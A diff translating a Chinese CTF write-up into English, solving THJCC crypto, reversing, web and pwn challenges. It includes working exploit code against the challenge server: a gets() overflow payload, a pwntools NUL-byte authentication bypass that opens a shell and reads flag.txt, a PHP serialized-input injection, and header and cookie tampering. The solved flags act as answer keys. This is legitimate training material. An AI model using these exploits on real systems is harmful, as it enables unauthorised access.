@@ -1,4 +1,4 @@
-# 來打 CTF 囉
+# Let's do CTF
 ## Twins
 Rem and Ram are twins, so of course, they're using twin primes when generating the public key.
 
@@ -31,8 +31,8 @@ print(f"{e = }")
 print(f"{C = }")
 ```
 
-而根據加密邏輯`C = pow(m, e, N)` （m 是 FLAG 的 bytes_to_long(FLAG)）
-現在的任務是根據 N, e, C 還原 m，也就是還原 FLAG。解法：從 N 開始做開根號，逆推出 p。
+Based on encryption logic `C = pow(m, e, N)` (where `m = bytes_to_long(FLAG)`),
+the task is to recover `m` from `N, e, C`, i.e., recover the FLAG. Method: start from square root of `N` and derive `p` backwards.
 ```
 from Crypto.Util.number import *
 from math import isqrt
@@ -41,17 +41,17 @@ N = 2826551278514866805468704316442447969302251840322261248808644570168912427315
 e = 65537
 C = 1234497647123308288391904075072934244007064896189041550178095227267495162612272877152882163571742252626259268589864910102423177510178752163223221459996160714504197888681222151502228992956903455786043319950053003932870663183361471018529120546317847198631213528937107950028181726193828290348098644533807726842037434372156999629613421312700151522193494400679327751356663646285177221717760901491000675090133898733612124353359435310509848314232331322850131928967606142771511767840453196223470254391920898879115092727661362178200356905669261193273062761808763579835188897788790062331610502780912517243068724827958000057923
 
-# 解出 p 和 q
+# Recover p and q
 p = isqrt(N - 1)
 while p * (p + 2) != N:
     p -= 1
 q = p + 2
 
-# 私鑰 d
+# Private key d
 phi = (p - 1) * (q - 1)
 d = inverse(e, phi)
 
-# 解密
+# Decrypt
 m = pow(C, d, N)
 flag = long_to_bytes(m)
 
@@ -71,8 +71,8 @@ MN ZGF'SB FJ NGS Y JFOOEB, UBSB'D Y TUYEEBWAB: RUKTT{DFXDR1R1GW_TMJU3S_1D_TGG1} 
 RSZ CBTGCMWA MR GS BIXBCCMWA MR LMRUMW ZGFS GLW TMJUBS. LUG QWGLD? ZGF IMAUR KFDR MWDJMSB DGIBGWB BEDB RG CMVB MWRG RUB LGSEC GN TSZJRYWYEZDMD.
 ```
 Hint: substitution
-根據提示推測這段密文看起來是經過**簡單替換加密（Substitution Cipher）**處理過的，並且很可能是**單一字母對應加密（Monoalphabetic Substitution Cipher）**。這類型的加密方式其實常出現在 CTF 題目中，也稱為凱薩加密變形或簡單替換密碼。
-用 [quipqiup](https://quipqiup.com/) 這個網站解出答案。
+From the hint, this ciphertext appears to use a **Substitution Cipher**, likely **Monoalphabetic Substitution**. This type is common in CTFs and can be seen as a Caesar-style variant/simple substitution.
+Use [quipqiup](https://quipqiup.com/) to solve it.
 
 **Flag: THJCC{SUBST1T1ON_CIPH3R_1S_COO1}**
 
@@ -120,33 +120,33 @@ else:
 
 signal.alarm(0)
 ```
-這是一個使用雙層 AES 加密來考驗逆推密文的題目。主要流程是：
-1. 隨機產生一個 16 bytes 的密文 target
-2. 用兩個隨機 key 進行兩次 AES ECB 模式加密（雙重加密）
-3. 顯示一個測試字串 test 和 target 經過雙重加密的結果
-4. 要求輸入 target 的原始明文
+This challenge uses double AES encryption and tests ciphertext inversion. Main flow:
+1. Randomly generate a 16-byte target plaintext
+2. Encrypt twice with AES-ECB using two random keys (double encryption)
+3. Show double-encrypted outputs of a known test string and target
+4. Ask for the original plaintext of target
 
-因此先在終端機執行
+So first run in terminal:
 ```
 (base) kql@Kclins-MacBook-Air ~ % nc chal.ctf.scint.org 12003
 8c03e8360e9b753a4b07a02d5c4f5624
 efa87975b86e8e6c8911199b140f047f
 ```
-拿到兩個隨機key後執行以下 Python 檔案
+After obtaining the two random keys, run the following Python code
 ```
 from Crypto.Cipher import AES
 from itertools import product
 import random
 
-# 把這兩個值改成題目執行時看到的值
+# Replace these two values with what the challenge outputs
 daes_test_hex = '8c03e8360e9b753a4b07a02d5c4f5624'
 daes_target_hex = 'efa87975b86e8e6c8911199b140f047f'
 
 # --- Known plaintext ---
 test_plain = b'you are my fire~'
 
-# --- Key 範圍 ---
-# 因為 key 是 b'whalekey:' + str(num)，num 範圍是 1000000 ~ 1999999
+# --- Key range ---
+# key = b'whalekey:' + str(num), with num in 1000000 ~ 1999999
 def gen_key(num):
     return b'whalekey:' + str(num).encode()
 
@@ -158,7 +158,7 @@ def enc(key, msg):
 def dec(key, msg):
     return AES.new(key, AES.MODE_ECB).decrypt(msg)
 
-# --- Stage 1: 前向映射 ---
+# --- Stage 1: forward mapping ---
 print('[*] Building forward table...')
 forward_table = {}
 for num in range(1000000, 2000000):
@@ -169,7 +169,7 @@ for num in range(1000000, 2000000):
     except:
         continue
 
-# --- Stage 2: 後向對比 ---
+# --- Stage 2: backward matching ---
 print('[*] Searching for key pair...')
 daes_test_bytes = bytes.fromhex(daes_test_hex)
 
@@ -193,8 +193,8 @@ for num in range(1000000, 2000000):
     except:
         continue
 ```
-接著拿到 Original target plaintext (hex): c84db0b50cfb69abd5382542312b8d7a
-故輸入 Ans 拿到 Flag
+Then we get Original target plaintext (hex): c84db0b50cfb69abd5382542312b8d7a
+Submit it as Ans to get the flag
 ```
 Ans:c84db0b50cfb69abd5382542312b8d7a
 THJCC{see_u_again_in_the_middle}
@@ -212,23 +212,23 @@ output.txt:
 ```
 Hint: what does the snake say?
 
-chal.py 的行為步驟：
-1. 把輸入字串轉成 8-bit binary 串
+`chal.py` behavior:
+1. Convert input string into an 8-bit binary stream
 ```
 ''.join(f"{ord(c):08b}" for c in SSSSS)
 ```
-2. 把整串二進位切成每 4 位（nibbles）
+2. Split binary stream into 4-bit chunks (nibbles)
 ```
 [i:i+4 for i in range(0, len(SSSSS) * 8, 4)]
 ```
-3. 每 4-bit 當作一個整數，做為 lookup 索引
+3. Treat each 4-bit chunk as an integer index for lookup
 ```
 index:  0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15
 char :  ! @ # $ % ^ & * ( )  {   }  [  ]  :  ;
 ```
-也就是說這題的關鍵就是把輸入做了 4-bit per char 的映射編碼，目的是要解碼 output.txt，把原始輸入（也就是 flag）找出來！
+So the key is a 4-bit-per-char mapping encoding. We need to decode `output.txt` to recover the original input (the flag).
 
-執行以下 Python 檔案
+Run this Python code
 ```
 charset = "!@#$%^&*(){}[]:;"
 encoded = "^$&:&@&}&^*$#!&@*#&^#!&^&[&;&:&*&@*%&^&%#!&[&)&]&#&[&^*$*$#!*#&^*!*%&)&[&^*$#!&;&&#!*%&(&^#!*$*^&#&;*#&%&^*##!^$&^*#*!&^&:*%&^*$#:#!%$&[&@&%&)*$*%&)&$&@&[&[*)#!*$*@*^&@&]&@*%&^*$#[#!*$&:&@&}&^*$#!&@*#&^#!&^&$*%&;*%&(&^*#&]&)&$#[#!&@&]&:&)&;*%&^#!*&&^*#*%&^&#*#&@*%&^*$#!&$&;*&&^*#&^&%#!&)&:#!&;*&&^*#&[&@*!*!&)&:&*#!*$&$&@&[&^*$#!&]*^&$&(#!&[&)&}&^#!&;*%&(&^*##!&]&^&]&#&^*#*$#!&;&&#!*%&(&^#!&**#&;*^*!#:#!%]&@&:*)#!*$*!&^&$&)&^*$#!&;&&#!*$&:&@&}&^*$#!&(&@*&&^#!*$&}*^&[&[*$#!**&)*%&(#!*$&^*&&^*#&@&[#!&]&;*#&^#!&{&;&)&:*%*$#!*%&(&@&:#!*%&(&^&)*##!&[&)*{&@*#&%#!&@&:&$&^*$*%&;*#*$#!&@&:&%#!*#&^&[&@*%&)*&&^*$#[#!&^&:&@&#&[&)&:&*#!*%&(&^&]#!*%&;#!*$**&@&[&[&;**#!*!*#&^*)#!&]*^&$&(#!&[&@*#&*&^*##!*%&(&@&:#!*%&(&^&)*##!&(&^&@&%*$#!#(&$*#&@&:&)&@&[#!&}&)&:&^*$&)*$#)#:#!^%&;#!&@&$&$&;&]&]&;&%&@*%&^#!*%&(&^&)*##!&:&@*#*#&;**#!&#&;&%&)&^*$#[#!*$&:&@&}&^*$#*#!*!&@&)*#&^&%#!&;*#&*&@&:*$#!#(*$*^&$&(#!&@*$#!&}&)&%&:&^*)*$#)#!&@*!*!&^&@*##!&;&:&^#!&)&:#!&&*#&;&:*%#!&;&&#!*%&(&^#!&;*%&(&^*##!&)&:*$*%&^&@&%#!&;&&#!*$&)&%&^#!&#*)#!*$&)&%&^#[#!&@&:&%#!&]&;*$*%#!&;&:&[*)#!&(&@*&&^#!&;&:&^#!&&*^&:&$*%&)&;&:&@&[#!&[*^&:&*#:#!^$&;&]&^#!*$*!&^&$&)&^*$#!*#&^*%&@&)&:#!&@#!*!&^&[*&&)&$#!&*&)*#&%&[&^#!**&)*%&(#!&@#!*!&@&)*##!&;&&#!*&&^*$*%&)&*&)&@&[#!&$&[&@***$#!&;&:#!&^&)*%&(&^*##!*$&)&%&^#!&;&&#!*%&(&^#!&$&[&;&@&$&@#:#!%[&)*{&@*#&%*$#!&(&@*&&^#!&)&:&%&^*!&^&:&%&^&:*%&[*)#!&^*&&;&[*&&^&%#!&^&[&;&:&*&@*%&^#!&#&;&%&)&^*$#!**&)*%&(&;*^*%#!&[&)&]&#*$#!&;*##!**&)*%&(#!&**#&^&@*%&[*)#!*#&^&%*^&$&^&%#!&[&)&]&#*$#!&@*%#!&[&^&@*$*%#!*%**&^&:*%*)#]&&&)*&&^#!*%&)&]&^*$#!*&&)&@#!&$&;&:*&&^*#&*&^&:*%#!&^*&&;&[*^*%&)&;&:#[#!&[&^&@&%&)&:&*#!*%&;#!&]&@&:*)#!&[&)&:&^&@&*&^*$#!&;&&#!&[&^&*&[&^*$*$#!&[&)*{&@*#&%*$#:#!^%&(&^*$&^#!*#&^*$&^&]&#&[&^#!*$&:&@&}&^*$#[#!&#*^*%#!*$&^*&&^*#&@&[#!&$&;&]&]&;&:#!&**#&;*^*!*$#!&;&&#!&[&^&*&[&^*$*$#!&[&)*{&@*#&%*$#!&(&@*&&^#!&^*)&^&[&)&%*$#!&@&:&%#!&^*(*%&^*#&:&@&[#!&^&@*#*$#[#!**&(&)&$&(#!*$&:&@&}&^*$#!&[&@&$&}#[#!&@&[*%&(&;*^&*&(#!*%&(&)*$#!*#*^&[&^#!&)*$#!&:&;*%#!*^&:&)*&&^*#*$&@&[#!#(*$&^&^#!%@&]*!&(&)*$&#&@&^&:&)&@#[#!%%&)&#&@&]&)&%&@&^#[#!&@&:&%#!^!*)&*&;*!&;&%&)&%&@&^#)#:#!&#&[&@&#&[&@&#&[&@#!%(&^*#&^#!&)*$#!*)&;*^*##!&&&[&@&*${#!^%%(%{%$%$*}^$%:%@%}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*]"
@@ -237,15 +237,15 @@ bin_str = ''
 for c in encoded:
     try:
         index = charset.index(c)
-        bin_str += f"{index:04b}"  # 每個轉回4-bit binary
+        bin_str += f"{index:04b}"  # convert each back to 4-bit binary
     except ValueError:
         print(f"Error: Character '{c}' not found in charset.")
         # Handle the error appropriately, e.g., skip the character, exit, or replace it
         continue #Skip the invalid character in encoded string.
 
-# 每8-bit一組轉回字元
+# Convert every 8 bits back to a character
 flag = ''.join(chr(int(bin_str[i:i+8], 2)) for i in range(0, len(bin_str), 8))
-print("解碼結果：", flag)
+print("Decoded result:", flag)
 ```
 **Flag: THJCC{SNAK3333333333333333}**
 
@@ -350,29 +350,29 @@ void main()
     }
 }
 ```
-程式使用 gets() 來讀取顧客名稱，這個函數容易受到緩衝區溢出攻擊，因為它不檢查輸入長度限制。而customer 結構體的內存佈局是：
-1. id（整數）
-2. name（20字節的字符數組）
-3. money（無符號短整型 - 2字節）
+The program uses `gets()` to read customer name, which is vulnerable to buffer overflow because it does not check input length. The `customer` struct layout is:
+1. id (integer)
+2. name (20-byte char array)
+3. money (unsigned short, 2 bytes)
 
-目標是選擇選項5獲取shell，但這需要擁有65535美元，但我只有100美元起始資金。
-首先創建生成攻擊字串的 Python 腳本。
+Goal is option 5 for shell, requiring 65535 dollars, but initial money is only 100.
+First create a Python script to generate payload.
 ```
 import struct
 
-# 創建有效載荷: 20個'A'加上小端序的0xFFFF (65535)
+# Create payload: 20 'A's + little-endian 0xFFFF (65535)
 payload = b'A' * 20 + struct.pack('<H', 0xffff)
 
-# 將結果寫入文件
+# Write result to file
 with open('payload.bin', 'wb') as f:
     f.write(payload)
-    # 添加選項5的選擇
+    # Add option 5 selection
     f.write(b'\n5\n')
 
-print("已創建payload.bin文件")
+print("payload.bin created")
 ```
-接下來直接執行腳本，但由於`cat payload.bin | nc chal.ctf.scint.org 10001`會讓互動一直循環不停止，所以要執行`(cat payload.bin; cat) | nc chal.ctf.scint.org 10001`
-之後就可購買 shell 並執行 ls -la
+Then run the script. Since `cat payload.bin | nc ...` loops interaction endlessly, use `(cat payload.bin; cat) | nc chal.ctf.scint.org 10001`.
+After that you can buy shell and run `ls -la`
 ```
 (base) kql@Kclins-MacBook-Air Desktop % (cat payload.bin; cat) | nc chal.ctf.scint.org 10001
 Enter your name: 1) cake 100$
@@ -410,22 +410,22 @@ drwxrwxrwt    1 root root 4096 Feb 17 12:05 tmp
 drwxr-xr-x    1 root root 4096 Jan 26 02:05 usr
 drwxr-xr-x    1 root root 4096 Jan 26 02:13 var
 ```
-找到 flag.txt
+Found `flag.txt`
 **Flag: THJCC{Y0uR_n@mE_I$_ToO_LoO0OOO00oO0000o0O00OoNG}**
 
 ## Headless
 Hint: I think robots are headless, but you are a real human, right?
-檢查robots.txt文件，發現了以下內容：
+Check `robots.txt` and find:
 ```
 User-Agent: *
 Disallow: /hum4n-0nLy
 ```
-訪問那個被禁止的路徑：/hum4n-0nLy
-執行以下指令
+Visit the disallowed path: `/hum4n-0nLy`
+Run:
 ```
 curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" http://chal.ctf.scint.org:10069/hum4n-0nLy
 ```
-查看到以下內容
+It shows:
 ```
 from flask import Flask, request, render_template, Response
 from flag import FLAG
@@ -453,24 +453,24 @@ def secret_flag():
 if name == 'main':
     app.run(host='0.0.0.0',port=80,debug=False）
 ```
-發現一個隱藏的路徑 `/r0b07-0Nly-9e925dc2d11970c33393990e93664e9d`
+Found hidden path `/r0b07-0Nly-9e925dc2d11970c33393990e93664e9d`
 
-再下指令
+Run another command
 ```
 (echo -e "GET /r0b07-0Nly-9e925dc2d11970c33393990e93664e9d HTTP/1.0\r\n\r\n"; sleep 1) | nc chal.ctf.scint.org 10069
 ```
-這個指令旨在繞過源代碼中的頭部檢查限制：
-1. GET 指明我們要獲取資源
-2. HTTP/1.0 是協議版本，HTTP/1.1 協議規定必須包含 Host 頭部
-HTTP/1.0 不要求 Host 頭部，允許我們發送零頭部請求
-3. \r\n\r\n 是兩個換行，表示HTTP頭部結束並開始請求主體
-4. sleep 1 讓程序暫停1秒，目的是保持連接開啟，給服務器足夠時間處理請求並返回結果
-5. 使用 netcat (nc) 工具建立到伺服器的TCP連接
-將之前Echo出的HTTP請求通過管道（pipe）發送到這個連接
+This command is meant to bypass the header check in source code:
+1. GET specifies the resource request
+2. HTTP/1.0 is the protocol version; HTTP/1.1 requires a Host header
+HTTP/1.0 does not require Host, allowing a zero-header request
+3. `\r\n\r\n` ends HTTP headers and starts body
+4. `sleep 1` keeps connection open for server processing
+5. `nc` creates raw TCP connection to server
+Pipe the echoed HTTP request into that connection
 
-故可做到發送一個不包含任何HTTP頭部的請求，從而滿足源代碼中的條件 if len(request.headers) > 1，讓其返回 Flag 而不是錯誤信息。由於一般的 HTTP 客戶端（如瀏覽器或常規的curl命令）會自動添加多個頭部，所以需要使用這種低層級的方法來控制確切發送的內容。
+This sends a request without extra HTTP headers, satisfying the source condition and returning the flag instead of error. Normal HTTP clients auto-add headers, so low-level control is needed.
 
-返回 Header 拿到 Flag
+Response returns the flag
 ```
 HTTP/1.1 200 OK
 Server: nginx/1.23.2
@@ -482,7 +482,7 @@ Connection: close
 THJCC{Rob0t_r=@lways_he@dl3ss...}
 ```
 
-## 西
+## West
 
 Hint: C language Chinese version
 
@@ -491,45 +491,45 @@ chal.c:
 #include <stdio.h>
 #include <stdint.h>
 #include <string.h>
-#define 掐 char
-#define 伊恩窺皮特_弗雷格 enrypted_flag
-#define 等於 =
-#define 佛以德 void
-#define 低窺皮特 decrypt
-#define 哀恩踢 int
-#define 小於 <
-#define 恩 n
-#define 佛 for
-#define 哀 i
-#define 加加 ++
-#define 立蘿 0
-#define 欸殼斯偶爾等於 ^=
-#define 欸服費 0xF5
-#define 面 main
-#define 衣服 if
-#define 欸斯踢阿鏈 strlen
-#define 鋪因特欸服 printf
-#define 趴欸斯 "%s"
-掐 伊恩窺皮特_弗雷格[] 等於 "\xa1\xbd\xbf\xb6\xb6\x8e\xa1\x9d\xc4\x86\xaa\xc4\xa6\xaa\x9b\xc5\xa1\xaa\x9a\x97\x93\xa0\xd1\x96\xb5\xa1\xc4\xba\x9b\x88";
+#define CH char
+#define encrypted_flag enrypted_flag
+#define EQ =
+#define VOID void
+#define decrypt_fn decrypt
+#define INT int
+#define LT <
+#define NVAR n
+#define FOR for
+#define IVAR i
+#define INC ++
+#define ZERO 0
+#define XOREQ ^=
+#define XKEY 0xF5
+#define MAIN main
+#define IFKW if
+#define STRLEN strlen
+#define PRINTF printf
+#define FMTS "%s"
+CH encrypted_flag[] EQ "\xa1\xbd\xbf\xb6\xb6\x8e\xa1\x9d\xc4\x86\xaa\xc4\xa6\xaa\x9b\xc5\xa1\xaa\x9a\x97\x93\xa0\xd1\x96\xb5\xa1\xc4\xba\x9b\x88";
 
-佛以德 低窺皮特(哀恩踢 恩)
+VOID decrypt_fn(INT NVAR)
 {
-    佛 (哀恩踢 哀 等於 立蘿; 哀 小於 恩; 哀 加加)
+    FOR (INT IVAR EQ ZERO; IVAR LT NVAR; IVAR INC)
     {
-        伊恩窺皮特_弗雷格[哀] 欸殼斯偶爾等於 欸服費;
+        encrypted_flag[IVAR] XOREQ XKEY;
     }
 }
 
-哀恩踢 面()
+INT MAIN()
 {
-    衣服 (立蘿)
+    IFKW (ZERO)
     {
-        低窺皮特(欸斯踢阿鏈(伊恩窺皮特_弗雷格));
+        decrypt_fn(STRLEN(encrypted_flag));
     }
-    鋪因特欸服(趴欸斯, 伊恩窺皮特_弗雷格);
+    PRINTF(FMTS, encrypted_flag);
 }
 ```
-因此可以得出程式碼為
+So the equivalent code is
 ```
 import binascii
 
@@ -546,8 +546,8 @@ print(decoded_flag.decode())
 
 ## APPL3 STOR3🍎
 
-找到隱藏頁面`http://chal.ctf.scint.org:8787/items?id=87`
-發現買不起 Flag ，故從 Cookie 更改 Product_Prices 的 Value 為 0
+Find hidden page `http://chal.ctf.scint.org:8787/items?id=87`
+Cannot afford flag, so modify Cookie `Product_Prices` value to 0
 
 **Flag: THJCC{Appl3_st0r3_M45t3r}**
 
@@ -555,22 +555,22 @@ print(decoded_flag.decode())
 
 Hint: STOP ATTACK MeEeeEeEEeeE Hey you! come here! Help me to find out WHO break my door!
 
-下載題目提供的 app.log ，其中有巨量的登入紀錄，先試著掃描一些關鍵字
+Download provided `app.log`; it contains huge login records, so first scan for keywords
 ```
 grep -Ei 'break|door|alarm|unauthorized' app.log
 ```
-發現還是有非常多的資料，因此再繼續篩
+Still too much data, so filter further
 ```
 grep '172.18.0.1' app.log | grep -v '404' | grep -E 'unlock|admin|door'
 ```
-發現其中一行的密碼有點奇怪，使用 base64 解碼
+One line has a suspicious password; decode it with base64
 
 **Flag: THJCC{L0g_F0r3N51C5_1s_E45Y}**
 
 ## Python Hunter 🐍
 
 Hint: Let’s catch python together!
-先將題目給的 hunter.cpython-38.pyc 轉成 Python 檔案
+First decompile provided `hunter.cpython-38.pyc` into Python file
 ```
 uncompyle6 hunter.cpython-38.pyc > hunter.py
 ```
@@ -622,7 +622,7 @@ if __name__ == "__main__":
 
 # okay decompiling hunter.cpython-38.pyc
 ```
-其核心邏輯段落（def qwe(abc, xyz):）是一個 XOR 解密器，用 key（第二參數）解密密文 abc（這裡是 d 陣列）。v = qwe(d, k) 就是用 "door_key" 來解密 d，得到的就是正確的 flag，所以我們只要跑以下程式碼即可。
+Core logic (`def qwe(abc, xyz):`) is an XOR decryptor: decrypt ciphertext `abc` (array `d`) with key `xyz`. `v = qwe(d, k)` uses `door_key` to decrypt `d`, giving the correct flag.
 ```
 d = [48, 39, 37, 49, 28, 16, 82, 17, 87, 13, 92, 71, 104, 52, 21, 0, 83, 
      7, 95, 28, 55, 30, 11, 78, 87, 29, 18]
@@ -643,7 +643,7 @@ print("Flag:", flag)
 
 ## Lime Ranger
 
-網頁原始碼：
+Page source:
 ```
 <?php 
 session_start();
@@ -676,24 +676,24 @@ if(isset($_GET["sellacc"])){
     if($_SESSION["inventory"]["UR"] + $_SESSION["inventory"]["SSR"] >= 10){
         exit("$flag");
     } else {
-        exit('你的帳號不值錢！');
+        exit('Your account is not valuable!');
     }
 }
 
 $draw_result = "";
 if(isset($_GET["draw1"])){
     if($_SESSION["balance"] < 40){
-        $draw_result = "寶石不足！";
+        $draw_result = "Not enough gems!";
     } else {
         $_SESSION["balance"] -= 40;
-        $draw_result = "恭喜獲得：" . implode("、", draw(1));
+        $draw_result = "Congratulations, you got: " . implode(", ", draw(1));
     }
 } elseif(isset($_GET["draw10"])){
     if($_SESSION["balance"] < 200){
-        $draw_result = "寶石不足！";
+        $draw_result = "Not enough gems!";
     } else {
         $_SESSION["balance"] -= 200;
-        $draw_result = "恭喜獲得：" . implode("、", draw(6));
+        $draw_result = "Congratulations, you got: " . implode(", ", draw(6));
     }
 }
 
@@ -709,28 +709,28 @@ function draw($n){
 function lookup($r){
     if($r <= 0.001){
         $_SESSION["inventory"]["UR"] += 1;
-        return "UR 極稀有";
+        return "UR Ultra Rare";
     } elseif($r <= 0.004){
         $_SESSION["inventory"]["SSR"] += 1;
-        return "SSR 超級稀有";
+        return "SSR Super Rare";
     } elseif($r <= 0.009){
         $_SESSION["inventory"]["SR"] += 1;
-        return "SR 稀有";
+        return "SR Rare";
     } elseif($r <= 0.016){
         $_SESSION["inventory"]["R"] += 1;
-        return "R 高級";
+        return "R Advanced";
     } else {
         $_SESSION["inventory"]["N"] += 1;
-        return "N 普通";
+        return "N Common";
     }
 }
 
 $characterNames = [
-    "UR" => "傳說守護者",
-    "SSR" => "超級英雄",
-    "SR" => "精英戰士",
-    "R" => "勇敢士兵",
-    "N" => "新手戰士"
+    "UR" => "Legendary Guardian",
+    "SSR" => "Super Hero",
+    "SR" => "Elite Warrior",
+    "R" => "Brave Soldier",
+    "N" => "Novice Warrior"
 ];
 ?>
 <!DOCTYPE html>
@@ -751,85 +751,85 @@ $characterNames = [
             <div class="balance">
                 <div class="balance-icon">💎</div>
                 <div class="balance-info">
-                    <span>你的寶石</span>
+                    <span>Your Gems</span>
                     <strong><?=$_SESSION["balance"];?></strong>
                 </div>
             </div>
-            <div class="user-id">玩家ID: <?=session_id();?></div>
+            <div class="user-id">Player ID: <?=session_id();?></div>
         </div>
         
         <div class="inventory">
-            <h3>你的角色收藏</h3>
+            <h3>Your Character Collection</h3>
             <div class="inventory-grid">
                 <div class="inventory-item UR">
                     <h4>UR</h4>
                     <p><?=$_SESSION["inventory"]["UR"];?></p>
                     <small><?=$characterNames["UR"];?></small>
-                    <div class="character-tooltip">極稀有角色，機率：0.1%</div>
+                    <div class="character-tooltip">Ultra rare character, rate: 0.1%</div>
                 </div>
                 <div class="inventory-item SSR">
                     <h4>SSR</h4>
                     <p><?=$_SESSION["inventory"]["SSR"];?></p>
                     <small><?=$characterNames["SSR"];?></small>
-                    <div class="character-tooltip">超級稀有角色，機率：0.3%</div>
+                    <div class="character-tooltip">Super rare character, rate: 0.3%</div>
                 </div>
                 <div class="inventory-item SR">
                     <h4>SR</h4>
                     <p><?=$_SESSION["inventory"]["SR"];?></p>
                     <small><?=$characterNames["SR"];?></small>
-                    <div class="character-tooltip">稀有角色，機率：0.5%</div>
+                    <div class="character-tooltip">Rare character, rate: 0.5%</div>
                 </div>
                 <div class="inventory-item R">
                     <h4>R</h4>
                     <p><?=$_SESSION["inventory"]["R"];?></p>
                     <small><?=$characterNames["R"];?></small>
-                    <div class="character-tooltip">高級角色，機率：0.7%</div>
+                    <div class="character-tooltip">Advanced character, rate: 0.7%</div>
                 </div>
                 <div class="inventory-item N">
                     <h4>N</h4>
                     <p><?=$_SESSION["inventory"]["N"];?></p>
                     <small><?=$characterNames["N"];?></small>
-                    <div class="character-tooltip">普通角色，機率：98.4%</div>
+                    <div class="character-tooltip">Common character, rate: 98.4%</div>
                 </div>
             </div>
         </div>
         
         <form class="draw-buttons" method="GET">
             <button type="submit" name="draw1" class="draw-button">
-                單抽
-                <span class="draw-cost">消耗40寶石</span>
+                Single Draw
+                <span class="draw-cost">Costs 40 gems</span>
             </button>
             <button type="submit" name="draw10" class="draw-button premium">
-                5+1連抽
-                <span class="draw-cost">消耗200寶石</span>
+                5+1 Multi Draw
+                <span class="draw-cost">Costs 200 gems</span>
             </button>
         </form>
         
         <form class="sellacc-container" method="GET">
             <button type="submit" name="sellacc" class="draw-button sellacc-button">
-                出售帳號
+                Sell Account
             </button>
         </form>
         
         <div class="bonus-section">
-            <h3>活動獎勵</h3>
-            <p>輸入獎勵碼以領取額外角色</p>
+            <h3>Event Rewards</h3>
+            <p>Enter a reward code to claim extra characters</p>
             <form method="GET">
                 <input type="text" name="bonus_code"size="80">
-                <button type="submit">領取獎勵</button>
+                <button type="submit">Claim Reward</button>
             </form>
         </div>
         
         <?php if($draw_result): ?>
         <div class="result">
-            <h2>抽獎結果</h2>
+            <h2>Draw Result</h2>
             <p><?=$draw_result;?></p>
         </div>
         <?php endif; ?>
         
         <div class="footer">
             <span>© 2025 Lime RANGER</span>
-            <a href="?view" class="source-link">查看源碼</a>
+            <a href="?view" class="source-link">View Source</a>
         </div>
     </div>
     
@@ -876,16 +876,16 @@ $characterNames = [
 
 Solve
 ```
-核心點在 bonus_code 那段，透過隨意往網頁上的欄位輸入內容得知 payload 會反應在網址上（?bonus_code=a%3A2%3A%3A%2...........）
+Core point is `bonus_code`: by entering arbitrary content in the field, you see payload reflected in URL (`?bonus_code=a%3A2%3A%3A%2...........`).
 
-解題步驟：
-1. 準備 payload
-我們要傳一個 bonus_code，使得
+Steps:
+1. Prepare payload
+Send a `bonus_code` so that:
 ```
 $_SESSION["inventory"]["UR"] += ?;
 $_SESSION["inventory"]["SSR"] += ?;
 ```
-目標為讓 UR+SSR >= 10
+Goal: make UR+SSR >= 10
 
 PHP: 
 ```
@@ -894,21 +894,21 @@ $payload = array("UR"=>5, "SSR"=>5);
 echo urlencode(serialize($payload));
 ?>
 ```
-以上會輸出：
+This outputs:
 ```
 a:2:{s:2:"UR";i:5;s:3:"SSR";i:5;}
 ```
-再將此段 payload 傳入網址參數：
+Then pass this payload in URL parameter:
 ```
 ?bonus_code=a%3A2%3A%7Bs%3A2%3A%22UR%22%3Bi%3A5%3Bs%3A3%3A%22SSR%22%3Bi%3A5%3B%7D
 ```
-再訪問出售頁面
+Then visit sell page
 
 **Flag: THJCC{lin3_r4nGeR_13_1ncreD!Ble_64m3?}**
 
 ## Insecure Shell
 
-Hint: SSH is outdated, ISSH is a more convenient alternative(雖然我不知道這個 Hint 的用意)
+Hint: SSH is outdated, ISSH is a more convenient alternative (not sure what this hint is for)
 
 chal.c: 
 ```
@@ -959,30 +959,30 @@ int main()
 }
 ```
 
-* 這段程式的功能是產生一組隨機密碼（15 bytes），提示使用者輸入密碼，如果輸入正確就執行 /bin/sh 打開 shell，否則顯示「Wrong password!」。
-* 漏洞 : 不初始化 password[15]：雖然只讀了 15 bytes，但 password 陣列共 16 bytes，最後一個位元沒有設定。使用者長度決定比對長度，比對只跑到strlen(buf)，如果使用者輸入的第一個字元就是 '\0'（也就是空字串），那麼 strlen(buf) 等於 0，check_password 根本不會進入迴圈就直接回傳「相等」，立即繞過檢查。
+* This program generates a random 15-byte password, asks for input, and runs `/bin/sh` on correct password; otherwise prints `Wrong password!`.
+* Vulnerability: `password[15]` remains uninitialized. Only 15 bytes are read into a 16-byte array. Comparison length is `strlen(buf)`. If first input byte is `\0` (empty string), `strlen(buf)=0`, loop never runs, and check returns equal, bypassing auth.
 
 exploit.py: 
 ```
 from pwn import *
 import os
 
-# 切換本地或遠端
+# Switch local/remote
 LOCAL = True
 
 p = remote('chal.ctf.scint.org', 10004)
 
-# 1) 等提示
+# 1) Wait for prompt
 p.recvuntil(b'Enter the password >')
 
-# 2) 發送一個 NUL byte 繞過 strlen 比對
-#    sendline 會自動在後面加上 '\n'
+# 2) Send one NUL byte to bypass strlen-based comparison
+#    sendline automatically appends '\n'
 p.sendline(b'\x00')
 
-# 3) 送出 cat flag.txt 取得旗標
+# 3) Send cat flag.txt to get flag
 p.sendline(b'cat flag.txt')
 
-# 4) 讀出並列印 flag
+# 4) Read and print flag
 flag = p.recvline(timeout=2).decode().strip()
 print("FLAG:", flag)
 
@@ -994,21 +994,21 @@ p.interactive()
 
 Hint: I used the Time GEM to put the flag to sleep...
 
-此題提供一個 Linux ELF 可執行檔 envy，執行後會印出 Flag 已沉睡，請喚醒 Flag。於是用 IDA 打開後發現有一段加密的字串`char enc[] = {
-  0x18, 0x2A, 0x19, 0x14, 0x2F, 0x17, ... // 類似這種形式
+This challenge provides Linux ELF executable `envy`, which says the flag is asleep and must be awakened. In IDA, an encrypted string appears: `char enc[] = {`
+  0x18, 0x2A, 0x19, 0x14, 0x2F, 0x17, ... // similar format
 };
 `
-解密函式中使用某種 XOR 加上偏移與時間有關的邏輯進行處理，解密完的結果即為 Flag。
-* XOR 邏輯大致為：
+The decrypt function uses XOR plus offset and time-related logic; decrypted output is the flag.
+* XOR logic roughly:
 decrypted[i] = encrypted[i] ^ key[i % keylen]
-* 解法策略：
